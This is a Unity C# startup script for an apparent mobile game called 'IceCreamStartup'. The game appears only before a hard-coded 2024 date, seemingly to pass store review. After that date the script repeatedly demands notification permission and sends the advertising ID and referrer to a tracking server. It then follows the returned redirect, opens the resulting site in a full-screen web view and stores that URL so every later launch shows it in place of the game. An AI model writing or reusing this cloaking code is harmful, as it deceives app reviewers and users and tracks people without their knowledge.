using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using System.Threading.Tasks;
using System;
using System.Net;
using System.IO;
using System.Linq;
using UnityEngine.UI;
using Newtonsoft.Json.Linq;

public class IceCreamStartup : MonoBehaviour
{
    [SerializeField] private OneSignalStartup iceCreamOS;

    [SerializeField] private Text statusText;

    [SerializeField] private GameObject game; //
    [SerializeField] private string startLink;
    [SerializeField] private string NJI_API_KEY;

    public static string UserAgentKey = "User-Agent";
    public static string[] UserAgentValue => new string[] { SystemInfo.operatingSystem, SystemInfo.deviceModel };

    private const string localUrlKey = "Local-Url";

    private bool NoInternet => Application.internetReachability == NetworkReachability.NotReachable;

    private string googleReferrer;

    class CpaObject
    {
        public string referrer;
    }

    IEnumerator Start()
    {
        if (DateTime.UtcNow < new DateTime(2024, 1, 31)) LaunchGame();

        yield return new WaitForSeconds(0.1f);
#if !UNITY_EDITOR
        bool acceptNotify = false;
        do
        {
            var permissionRequest = RequestNotifyPermission();
            yield return new WaitUntil(() => !permissionRequest.IsCompleted);
            acceptNotify = permissionRequest.Result;
        }
        while (!acceptNotify);
#endif

        try
        {
            iceCreamOS.Initialize();
        }
        catch (Exception ex)
        {
            statusText.text += '\n' + ex.Message;
        }

        yield return null;

        if (NoInternet)
        {
            LaunchGame();
        }
        else
        {
            var saveLink = PlayerPrefs.GetString(localUrlKey, "null");
            if (saveLink == "null")
            {
                string linkExample = startLink + $"/session/v3/{NJI_API_KEY}";

                var delay = 15f;

                while (string.IsNullOrEmpty(googleReferrer) && delay > 0f)
                {
                    yield return new WaitForSeconds(Time.deltaTime);
                    delay -= Time.deltaTime;
                }

                //OS
#if !UNITY_EDITOR
                try
                {
                    iceCreamOS.SetExternalId(GetAdvertisingID());
                } 
                catch (Exception ex) { statusText.text += $"\n {ex}"; }

                yield return null;
#endif

                //link
                linkExample = ConnectSubs(linkExample);
                yield return null;

                //NJI get link
                var response = Request(linkExample);
                delay = 9f;
                while (!response.IsCompleted && delay > 0f)
                {
                    yield return new WaitForSeconds(Time.deltaTime);
                    delay -= Time.deltaTime;
                }

                yield return null;
                //CHECK
                if (!response.IsCompleted || response.IsFaulted) LaunchGame();

                yield return null;
                if (string.IsNullOrEmpty(response.Result)) LaunchGame();

                var firstPost = JObject.Parse(response.Result);

                if (firstPost.ContainsKey("response"))
                {
                    linkExample = firstPost.Property("response").Value.ToString();

                    if (string.IsNullOrEmpty(linkExample))
                    {
                        LaunchGame();
                    }
                }
                else LaunchGame();

                yield return null;


                //REDI KEYTAR
                var redi = GetEndUrlInfoAsync(new Uri(linkExample));
                delay = 9f;
                while (!redi.IsCompleted && delay > 0f)
                {
                    yield return new WaitForSeconds(Time.deltaTime);
                    delay -= Time.deltaTime;
                }

                yield return null;
                //CHECK
                if (!response.IsCompleted || response.IsFaulted) LaunchGame();

                yield return null;

                var successCode = ((int)redi.Result.StatusCode >= 200 && (int)redi.Result.StatusCode < 300) || redi.Result.StatusCode == HttpStatusCode.Forbidden;
                if (!successCode || redi.Result.RequestMessage.RequestUri.AbsoluteUri == linkExample) LaunchGame();

                yield return null;

                if (redi.Result.RequestMessage.RequestUri.AbsoluteUri.Contains("privacypolicyonline"))
                {
                    //OpenView(res.Result.RequestMessage.RequestUri.AbsoluteUri);
                    //yield return new WaitForSeconds(5f);
                    LaunchGame();
                }

                //////////////////////
                yield return null;
                OpenView(redi.Result.RequestMessage.RequestUri.AbsoluteUri);

                //Onesignal work
                while (string.IsNullOrEmpty(iceCreamOS.UserId))
                {
                    yield return new WaitForSeconds(Time.deltaTime);
                }

                var afterWebResponse = RequestAfter("https://app.njatrack.tech" +
                    $"/technicalPostback/v1.0/postClientParams/{firstPost.Property("client_id")?.Value}?onesignal_player_id={iceCreamOS.UserId}");

                //////////////////////
                yield return null;

                PlayerPrefs.SetString(localUrlKey, redi.Result.RequestMessage.RequestUri.AbsoluteUri);
            }
            else
            {
                OpenView(saveLink);
            }
        }
    }

#region requests

    public async Task<string> Request(string url)
    {
        var httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
        httpWebRequest.UserAgent = GetHttpAgent();
        httpWebRequest.Headers.Set(HttpRequestHeader.AcceptLanguage, GetAcceptLanguageHeader());
        httpWebRequest.ContentType = "application/json";
        httpWebRequest.Method = "POST";

        using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
        {
            string json = JsonUtility.ToJson(new CpaObject
            {
                referrer = googleReferrer,
            });

            streamWriter.Write(json);
        }

        var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse();
        using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
        {
            return await streamReader.ReadToEndAsync();
        }
    }

    public static async Task<System.Net.Http.HttpResponseMessage> GetEndUrlInfoAsync(Uri uri, System.Threading.CancellationToken cancellationToken = default)
    {
        using var client = new System.Net.Http.HttpClient(new System.Net.Http.HttpClientHandler
        {
            AllowAutoRedirect = true,
        }, true);
        client.DefaultRequestHeaders.Add(UserAgentKey, UserAgentValue);

        using var response = await client.GetAsync(uri, cancellationToken);

        return response;
    }

    public async Task<WebResponse> RequestAfter(string url)
    {
        var httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
        httpWebRequest.UserAgent = GetHttpAgent();
        httpWebRequest.Headers.Set(HttpRequestHeader.AcceptLanguage, GetAcceptLanguageHeader());
        httpWebRequest.ContentType = "application/json";
        httpWebRequest.Method = "POST";
        using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
        {
            streamWriter.Write("{}");
        }

        return await httpWebRequest.GetResponseAsync();
    }

#endregion

    UniWebView webView;
    private void OpenView(string url)
    {
        try
        {
            webView = gameObject.AddComponent<UniWebView>();
            webView.Frame = new Rect(0, 0, Screen.width, Screen.height);
            webView.OnOrientationChanged += (view, orientation) =>
            {
                // Set full screen again. If it is now in landscape, it is 640x320.
                Invoke("ResizeView", Time.deltaTime);
            };

            webView.Load(url);
            webView.Show();
            webView.OnMultipleWindowOpened += (view, id) => { webView.Load(view.Url); };
            webView.SetSupportMultipleWindows(true, true);
            webView.OnShouldClose += (view) => { return view.CanGoBack; };
        }
        catch (Exception ex)
        {
            statusText.text += $"\n {ex}";
        }
    }

    private void ResizeView()
    {
        webView.Frame = new Rect(0, 0, Screen.width, Screen.height);
    }


#region link builder

    private string ConnectSubs(string olderLink)
    {
        return olderLink + "?" +
            $"gaid={GetAdvertisingID()}";
    }

#endregion

    private void LaunchGame()
    {
        game.SetActive(true);
        StopAllCoroutines();

        if (PlayerPrefs.HasKey(localUrlKey)) iceCreamOS.Unsubscribe();
    }

    public string GetHttpAgent()
    {
#if (UNITY_ANDROID && !UNITY_EDITOR) || ANDROID_CODE_VIEW
        try
        {
            using (AndroidJavaClass cls = new AndroidJavaClass("java.lang.System"))
            {
                if (cls != null)
                    return cls.CallStatic<string>("getProperty", "http.agent");
            }
        }
        catch (Exception e)
        {
            statusText.text += $"\n{e.Message}";
        }
#endif

        return string.Join(',', UserAgentValue);
    }

    public string GetAcceptLanguageHeader()
    {
#if (UNITY_ANDROID && !UNITY_EDITOR) || ANDROID_CODE_VIEW
                try
        {
            using (AndroidJavaClass cls = new AndroidJavaClass("androidx.core.os.LocaleListCompat"))
            {
                if (cls != null)
                    using (AndroidJavaObject locale = cls.CallStatic<AndroidJavaObject>("getAdjustedDefault"))
                    {
                        List<string> tags = new List<string>();
                        float size = locale.Call<int>("size");
                        float weight = 1.0f;

                        for(var i = 0; i < size; i++)
                        {
                            weight -= 0.1f;
                            tags.Add(locale.Call<AndroidJavaObject>("get", i).Call<string>("toLanguageTag") + $";q={weight}");
                        }

                        return string.Join(',', tags);
                    }
            }
        }
        catch (Exception e)
        {
            statusText.text += $"\n{e.Message}";
        }
#endif

        return "en-US;q=$0.9";
    }

    public static string GetAdvertisingID()
    {
        string _strAdvertisingID = "";

#if (UNITY_ANDROID && !UNITY_EDITOR) || ANDROID_CODE_VIEW
            try
            {
                using (AndroidJavaClass up =  new AndroidJavaClass("com.unity3d.player.UnityPlayer"))
                {
                    using (AndroidJavaObject currentActivity = up.GetStatic<AndroidJavaObject>("currentActivity"))
                    {
                        using (AndroidJavaClass client =  new AndroidJavaClass("com.google.android.gms.ads.identifier.AdvertisingIdClient"))
                        {
                            using (AndroidJavaObject adInfo = client.CallStatic<AndroidJavaObject>("getAdvertisingIdInfo", currentActivity))
                            {
                                if (adInfo != null)
                                {
                                    _strAdvertisingID = adInfo.Call<string>("getId");
                                    if (string.IsNullOrEmpty(_strAdvertisingID))
                                        _strAdvertisingID = "";
                                }
                            }
                        }
                    }
                }
            }
            catch (System.Exception e)
            {

            }
#endif
        return _strAdvertisingID;
    }

    private async Task<bool> RequestNotifyPermission()
    {
        if (OneSignalSDK.OneSignal.Notifications.Permission) return true;

        return await OneSignalSDK.OneSignal.Notifications.RequestPermissionAsync(true);
    }
}